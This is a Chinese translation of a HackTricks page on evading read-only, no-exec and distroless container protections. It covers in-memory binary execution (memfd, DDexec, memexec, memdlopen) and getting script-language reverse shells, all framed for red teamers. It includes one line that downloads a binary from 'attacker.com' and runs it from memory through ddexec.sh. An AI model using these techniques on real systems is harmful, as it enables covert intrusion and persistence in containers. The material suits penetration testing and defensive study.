# 绕过文件系统保护：只读 / 无执行 / Distroless

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

如果您对**黑客职业**感兴趣并想要黑掉不可能黑掉的东西 - **我们正在招聘！**（需要流利的波兰语书面和口语表达能力）。

{% embed url="https://www.stmcyber.com/careers" %}

## 视频

在以下视频中，您可以找到本页中提到的技术的更深入解释：

* [**DEF CON 31 - 探索Linux内存操作以实现隐蔽和规避**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**使用DDexec-ng和内存dlopen()进行隐蔽入侵 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## 只读 / 无执行场景

在Linux机器上发现**只读（ro）文件系统保护**变得越来越普遍，特别是在容器中。这是因为在容器中运行只读文件系统只需在`securitycontext`中设置**`readOnlyRootFilesystem: true`**即可：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

然而，即使文件系统被挂载为只读，**`/dev/shm`**仍然是可写的，因此我们可以在磁盘上写入内容。但是，此文件夹将以**无执行保护**方式被挂载，因此如果您在此处下载二进制文件，则**无法执行**它。

{% hint style="warning" %}
从红队的角度来看，这使得下载和执行不在系统中的二进制文件（如后门或枚举器如`kubectl`）变得**复杂**。
{% endhint %}

## 最简单的绕过方法：脚本

请注意，我提到了二进制文件，只要解释器在机器内部，您可以执行任何脚本，比如**shell脚本**（如果存在`sh`）或**Python脚本**（如果安装了`python`）。

然而，这仅仅足以执行您的二进制后门或其他可能需要运行的二进制工具。

## 内存绕过

如果您想要执行一个二进制文件，但文件系统不允许，最好的方法是**从内存中执行**，因为**保护在那里不适用**。

### FD + exec系统调用绕过

如果您在机器内部有一些强大的脚本引擎，比如**Python**、**Perl**或**Ruby**，您可以将要执行的二进制文件下载到内存中，将其存储在内存文件描述符（`create_memfd`系统调用）中，这不会受到这些保护的保护，然后调用**`exec`系统调用**，指示**fd作为要执行的文件**。

为此，您可以轻松使用项目[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)。您可以将二进制文件传递给它，它将生成一个以指定语言编写的脚本，其中包含**使用指令对二进制文件进行压缩和b64编码**以及在调用`create_memfd`系统调用创建`fd`并调用**exec**系统调用运行它的说明。

{% hint style="warning" %}
这在其他脚本语言（如PHP或Node）中不起作用，因为它们没有任何从脚本中**调用原始系统调用**的默认方法，因此无法调用`create_memfd`来创建**存储二进制文件的内存fd**。

此外，在`/dev/shm`中创建一个**常规fd**中的文件是行不通的，因为您将无法运行它，因为**无执行保护**将适用。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)是一种允许您通过覆盖其**`/proc/self/mem`**来**修改自己进程的内存**的技术。

因此，通过**控制进程执行的汇编代码**，您可以编写一个**shellcode**并“变异”进程以**执行任意代码**。

{% hint style="success" %}
**DDexec / EverythingExec**将允许您从**内存**中加载和**执行**您自己的**shellcode**或**任何二进制文件**。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec)是DDexec的自然下一步。它是一个**DDexec shellcode demonised**，因此每次您想要**运行不同的二进制文件**时，您无需重新启动DDexec，只需通过DDexec技术运行memexec shellcode，然后**与此守护进程通信以传递要加载和运行的新二进制文件**。

您可以在[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)中找到如何使用**memexec执行PHP反向shell**的示例。

### Memdlopen

与DDexec有类似目的，[**memdlopen**](https://github.com/arget13/memdlopen)技术允许更容易地将二进制文件加载到内存中以后执行。甚至可以加载具有依赖关系的二进制文件。

## Distroless Bypass

### 什么是distroless

Distroless容器仅包含运行特定应用程序或服务所需的**最少组件**，例如库和运行时依赖项，但不包括诸如软件包管理器、shell或系统实用程序等较大的组件。

Distroless容器的目标是通过消除不必要的组件**减少容器的攻击面**，并最小化可以被利用的漏洞数量。

### 反向Shell

在distroless容器中，您可能**找不到`sh`或`bash`**以获取常规shell。您也不会找到诸如`ls`、`whoami`、`id`等二进制文件...通常在系统中运行的所有内容。

{% hint style="warning" %}
因此，您**无法**像通常那样获得**反向shell**或**枚举**系统。
{% endhint %}

但是，如果受损的容器例如正在运行flask web，则已安装了python，因此您可以获取**Python反向shell**。如果正在运行node，则可以获取Node反向shell，大多数任何**脚本语言**都可以。

{% hint style="success" %}
使用脚本语言，您可以使用语言功能**枚举系统**。
{% endhint %}

如果没有**`read-only/no-exec`**保护，您可以滥用反向shell在文件系统中**写入您的二进制文件**并**执行**它们。

{% hint style="success" %}
但是，在这种类型的容器中，这些保护通常存在，但您可以使用**先前的内存执行技术来绕过它们**。
{% endhint %}

您可以在[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)中找到如何**利用一些RCE漏洞**获取脚本语言**反向shell**并从内存中执行二进制文件的**示例**。

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

如果您对**黑客职业**感兴趣并想要黑入不可黑入的 - **我们正在招聘！**（需要流利的波兰语书面和口语）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>
